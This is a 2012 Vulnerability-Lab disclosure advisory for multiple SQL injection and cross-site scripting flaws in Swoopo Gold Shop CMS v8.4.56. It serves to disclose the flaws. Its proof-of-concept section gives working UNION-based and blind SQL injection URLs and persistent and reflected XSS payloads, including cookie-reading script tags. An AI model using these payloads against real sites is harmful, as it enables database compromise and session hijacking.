@@ -1,0 +1,312 @@
+Title:
+======
+Swoopo Gold Shop CMS v8.4.56 - Multiple Web Vulnerabilities
+
+
+Date:
+=====
+2012-05-14
+
+
+References:
+===========
+http://www.vulnerability-lab.com/get_content.php?id=515
+
+
+VL-ID:
+=====
+515
+
+
+Common Vulnerability Scoring System:
+====================================
+8.5
+
+
+Introduction:
+=============
+Swoopo Gold is a shop content management system coded with PHP, Jsp & connected via MySQL Database. 
+
+    Scratch Auction.
+    Future Auction.
+    Buy-now system.
+    Bid-back System.
+    Referral System.
+    Offline order processing.
+    Change shipping status from Admin-Panel.
+    Captcha at registration.
+    Display bid-type at bid history.
+    Display return-policy in auction details page.
+    Advance Autobidder.
+    Banner rotator.
+    1 year free technical support.
+    No Encryption.
+    No Callback.
+    Standard Auction, Penny Auction, Beginner Auction, 10 Second Auction, 15 Second Auction, 20 Second Auction
+    User registration and account verification.
+    Member login, account updating, purchasing more bids and paying for won auctions features.
+    Buying bid packages.
+    Set bidding packages.
+    Bidding in the Penny Auction format. Pay per bid and the price increment by a set amount.
+    Time increment by 10 seconds (can be changed in the CMS) each time a bid is placed.
+    Bid butler system - the ability for users tobook their bids.
+    An editable “Terms and conditions” and “Help section” page. Additional pages can also be incorporated.
+    A newsletter sign up system and sending capability.
+    Update & add the latest news articles.
+    Send newsletters to members signed up for the newsletter.
+    Paypal as the default payment gateway.
+    Users can receive free bids for registering, for winning their first auction and for buying bid packages for the first time.
+    View, edit, add, delete and suspend users.
+    Add, edit, delete and clone
+    Limits on the number of auctions a user can win.
+    Winning bidder can be viewed and the auction status can be update - e.g. paid, awaiting shipping, shipped and completed.
+    View users bidding history, purchased bid packages, add free bids to the user and refund bids for the user.
+    View referrals from users.
+    Coupons module.
+    Rewards points system when packages are purchased.
+    Credit system for auctions which users lose, which can be used for won auctions.
+    Manage unlimited website categories viz. add, edit and delete.
+    Edit general website settings viz. turning on and off various features.
+    Add, edit and delete countries that you want to include.
+
+(Copy of the Vendor Homepage: http://itechscripts.com/swoopo_clone.html )
+
+
+Abstract:
+=========
+The Vulnerability Laboratory Researcher Team discovered multiple Web Vulnerabilities in ITtechScripts Swoopo Gold Shop CMS v8.4.56.
+
+
+Report-Timeline:
+================
+2012-05-14:	Public or Non-Public Disclosure
+
+
+Status:
+========
+Published
+
+
+Affected Products:
+==================
+ITechScripts
+Product: Swoopo Gold Shop CMS v8.4.56
+
+
+Exploitation-Technique:
+=======================
+Remote
+
+
+Severity:
+=========
+Critical
+
+
+Details:
+========
+1.1
+A remote SQL Injection vulnerability is detected in ITtechScripts Swoopo Gold Shop CMS v8.4.56.
+The vulnerability allows an attacker (remote) or local low privileged user account to inject/execute own sql commands 
+on the affected application dbms. Successful exploitation of the vulnerability results in dbms & application compromise.
+The vulnerability is located on the username post method.
+
+Vulnerable Module(s):
+				[+] EX_DATE - ID
+
+
+1.2
+A blind SQL Injection vulnerability is detected in ITtechScripts Swoopo Gold Shop CMS v8.4.56.
+The vulnerability allows an attacker (remote) or local low privileged user account to inject/execute own sql commands 
+on the affected application dbms. Successful exploitation of the vulnerability results in dbms & application compromise.
+The vulnerability is located on the itechd.php file in the product id value.
+
+Vulnerable Module(s):
+ 				[+] itechd - Product ID
+
+
+
+2.1
+Multiple persistent input validation vulnerabilities are detected in ITtechScripts Swoopo Gold Shop CMS v8.4.56.
+The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent).
+Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) 
+context manipulation. Exploitation requires low user inter action because the admin needs to watch the user list.
+The user includes his scriptcode as profile name and the code is getting executed on the administrator section 
+persistent.
+
+
+Vulnerable Module(s):
+				[+] Contact Form - TEXT NAME
+				[+] TellaFreind - E-Mail ID
+
+
+2.2
+Multiple non persistent cross site scripting vulnerabilities are detected in ITtechScripts Swoopo Gold Shop CMS v8.4.56.
+The vulnerability allows remote attackers to hijack website customer, moderator or admin sessions with high required 
+user inter action or local low privileged user account. Successful exploitation can result in account steal, phishing 
+& client-side content request manipulation.
+
+Vulnerable Module(s):
+				[+] All_Live
+				[+] List_Type
+				[+] User_Reg - TxTcity
+				[+] reviewitechds - Product ID
+
+
+Proof of Concept:
+=================
+1.1
+The sql inejction vulnerability can be exploited by remote attackers without required user inter action.
+For demonstration or reproduce ...
+
+Poc:
+<a href=”http://127.0.0.1:80/swoopogold/ex_date.php?id=-595+union+select+version%28%29,database%28%29,3,4,user%28%29--%20-”>
+<img src=”www.vulnerability-lab.com/gfx/logo-header.png” width=”137 height=”137" /></a>
+
+
+
+1.2
+The blind sql inejction vulnerability can be exploited by remote attackers without required user inter action.
+For demonstration or reproduce ...
+
+PoC:
+Pay=Select%20Payment%20Method&paymentid=1&productid=576%24%7b[BLIND SQL-INJECTION VULNERABILITY]%7d&recycle=[rem0ve]
+
+<a href=”http://127.0.0.1:80/swoopogold/itechd.php?productid=604+AND+1=2--%20-[BLIND SQL-INJECTION VULNERABILITY]”>
+<img src=”www.vulnerability-lab.com/gfx/logo-header.png” width=”137 height=”137" /></a>
+
+
+
+2.1
+The input validation vulnerabilities can be exploited by remote attackers with low-medium required user inter action.
+For demonstration or reproduce ...
+
+
+Review:		Contact Name Output
+
+<form name="frmContact" action="contact.php" method="post"></form>
+<tr><td colspan="3" align="right">
+<font color="red">Fields marked with an asterisk (*) 
+are required  </font></td></tr>
+<tr><td><blockquote>  
+
+<img src="templates/Default/img_files/xclabid.gif"></blockquote></td>
+<td><font class="head_font" color="red">
+The following must be corrected before continuing:</font></td>
+</tr>
+<tr><td> </td><td> Dont match the 
+image</td></tr>
+<tr><td colspan="2" align="center"><hr class="hr_color" noshade="noshade" size="1" width="70%">
+</td></tr>
+<tr><td><blockquote><b>  Name<font color="red">*</font></b> 
+</blockquote></td>
+<td>
+<input name="txtName" class="txtbox" value="\" type="text">
+<iframe src="a" onload='alert("VL")' <"="" size="20"></td>
+</tr><tr><td><blockquote></b><b>  Email 
+id<font color="red">*</font></b></td>
+
+<td>
+<input type="text" name="txtEmail" class="txtbox" value="gabber@aol.com" size="20"></td>
+</tr>
+<tr>
+<td><blockquote><b>  Company Name</b></td>
+<td>
+
+<input type="text" name="txtCname" class="txtbox"  
+value="\"><iframe src=a onload=alert("VL") <" size="25"></td>
+          </tr>
+
+URL:		http://127.0.0.1:80/swoopogold/contact.php
+
+
+
+Review:		TellaFriend Listing Output
+
+<tbody><tr>
+<td class="ct"><b>Email id</b> </td>
+<td class="ct"><b>Date</b> </td>
+<td class="ct">Registration Details</td>
+</tr>
+<tr>
+<td>chaudhurisuvarthi@gmail.com</td>
+<td>2009-02-12 16:08:54</td>
+<td>no</td>
+</tr>
+<tr>
+<td>-1'</td>
+<td>2012-04-14 17:51:41</td>
+<td>no</td>
+</tr>
+<tr>
+<td>>"<script>alert(document.cookie)</script></td>
+<td>2012-04-14 17:52:08</td>
+<td>no</td>
+</tr>
+</tbody>
+
+URL:		http://127.0.0.1:80/swoopogold/tellafriend.php
+
+
+
+2.2
+The non persistent cross site scripting vulnerabilities can be exploited by remote attackers with medium 
+or high required user inter action. For demonstration or reproduce ...
+
+Note: URL encoded GET via input cats_id.
+
+PoC:
+all_live.php?cats_id=<script>alert(document.cookie)</script>&list_type=0
+all_live.php?cats_id=14&list_type=<script>alert(document.cookie)</script>
+reviewitechds.php?productid=%<script>alert(document.cookie)</script>&recycle=yes
+
+POST (multipart) input txtcity  set  " onmouseover=prompt(1337)=">
+The input is getting reflected executed out of the tag element
+
+
+Risk:
+=====
+1.1
+The security risk of the remote sql injection vulnerability is estimated as critical.
+
+1.2
+The security risk of the blind sql injection vulnerability is estimated as critical.
+
+2.1
+The security risk of the persistent input validation vulnerabilities are estimated as medium(+).
+
+2.2
+The security risk of the non-persistent cross site scripting vulnerabilities are estimated as low(+).
+
+
+Credits:
+========
+Vulnerability Laboratory [Research Team] - Ibrahim El-Sayed (the St0rm) (storm@vulnerability-lab.com)
+Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri  (bkm@vulnerability-lab.com)
+
+
+Disclaimer:
+===========
+The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
+either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
+Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
+profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
+states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
+may not apply.
+
+Domains:	www.vulnerability-lab.com   - www.vuln-lab.com
+Section:	video.vulnerability-lab.com - forum.vulnerability-lab.com - news.vulnerability-lab.com
+Contact:	admin@vulnerability-lab.com - support@vulnerability-lab.com - irc.vulnerability-lab.com
+
+Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
+Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
+other media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+
+    						Copyright © 2012 Vulnerability-Lab
+
+-- 
+VULNERABILITY RESEARCH LABORATORY TEAM
+Website: www.vulnerability-lab.com
+Mail: research@vulnerability-lab.com
+
+
